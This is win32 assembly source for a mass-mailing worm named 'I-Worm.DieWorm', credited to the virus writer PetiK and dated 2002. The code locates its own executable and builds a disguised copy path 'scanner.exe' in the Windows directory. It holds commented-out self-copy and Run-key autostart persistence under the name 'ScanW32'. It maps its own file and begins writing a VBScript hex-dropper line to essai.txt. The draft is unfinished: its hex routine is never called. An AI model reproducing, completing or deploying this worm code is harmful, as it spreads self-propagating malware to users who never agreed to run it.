comment *
Name : I-Worm.DieWorm
Author : PetiK
Date : July 10th 2002

Language : win32asm
*

.586p
.model flat
.code

JUMPS

include useful.inc


api macro a
    extrn a:proc
    call a
endm

start:

get_name:
    push    50
    mov esi,offset orgwrm
    push    esi
    push    0
    api GetModuleFileNameA

get_copy_name:
    mov edi,offset cpywrm
    push    edi
    push    50
    push    edi
    api GetWindowsDirectoryA
    add edi,eax
    mov eax,'acs\'
    stosd
    mov eax,'renn'
    stosd
    mov eax,'exe.'
    stosd
    pop edi

copy_worm:
;   push    0
;   push    edi
;   push    esi
;   api CopyFileA

;   push    50
;   push    edi
;   push    1
;   @pushsz "ScanW32"
;   @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
;   push    80000002h
;   api SHSetValueA

    push    0
    push    0
    push    3
    push    0
    push    1
    push    80000000h
    push    offset orgwrm
    api CreateFileA
    inc eax
    je  end_worm
    dec eax
    xchg    ebx,eax

    push    0
    push    0
    push    0
    push    2
    push    0
    push    ebx
    api CreateFileMappingA
    test    eax,eax
    je  end_w1
    xchg    eax,ebp

    push    0
    push    0
    push    0
    push    4
    push    ebp
    api MapViewOfFile
    test    eax,eax
    je  end_w2
    xchg    eax,esi

    push    0
    push    ebx
    api GetFileSize
    mov [size],eax

    push    40h
    @pushsz "Hello"
    @pushsz "Hello"
    push    0
    api MessageBoxA

    push    0
    push    80h
    push    2
    push    0
    push    1
    push    40000000h
    @pushsz "essai.txt"
    api CreateFileA
    mov [hvba],eax


@start_hex:
    mov cnt,0
    mov edi,offset dochex
    push    edi
    
    @pushsz "e = e & """
    push    offset dochex
    api lstrcat
    pop edi

    push    0
    push    offset byte
    push    112
    push    offset dochex
    push    [hvba]
    api WriteFile


    push    [hvba]
    api CloseHandle

    f_hex:
end_w3: push    esi
    api UnmapViewOfFile
end_w2: push    ebp
    api CloseHandle
end_w1: push    ebx
    api CloseHandle



end_worm:
    push    0
    api ExitProcess

conv_hex:
    PUSH ECX
    PUSH EDI

    XOR ECX, ECX
    MOV CL, AL
    PUSH ECX
    SHR CL, 04h
    LEA EDI, Tab_Hex
    INC CL

    @@Y:
    INC EDI
    DEC CL
    JNZ @@Y

    DEC EDI
    MOV AL, BYTE PTR [EDI]
    POP ECX
    AND CL, 0Fh
    LEA EDI, Tab_Hex
    INC CL

    @@X:
    INC EDI
    DEC CL
    JNZ @@X

    DEC EDI
    MOV AH, BYTE PTR [EDI]
    POP EDI
    POP ECX

    RET



.data
orgwrm  db 50 dup (0)
cpywrm  db 50 dup (0)
dochex  db 112 dup (0)
hfile   dd ?
hvba    dd ?
byte    dd 0
size    dd ?
cnt dd ?
Tab_Hex db      "0123456789ABCDEF", 00h

ends
end start
